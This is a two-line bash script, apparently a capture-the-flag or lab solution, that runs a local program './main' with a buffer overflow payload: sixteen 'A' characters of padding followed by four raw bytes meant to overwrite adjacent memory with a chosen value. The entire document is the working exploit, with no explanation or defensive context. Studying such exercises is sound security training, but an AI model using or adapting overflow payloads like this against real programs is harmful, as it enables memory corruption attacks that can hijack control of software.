#! /bin/bash

./main $(python3 -c "print('A'*16, '\x66\x62\x55\x56', sep='')")
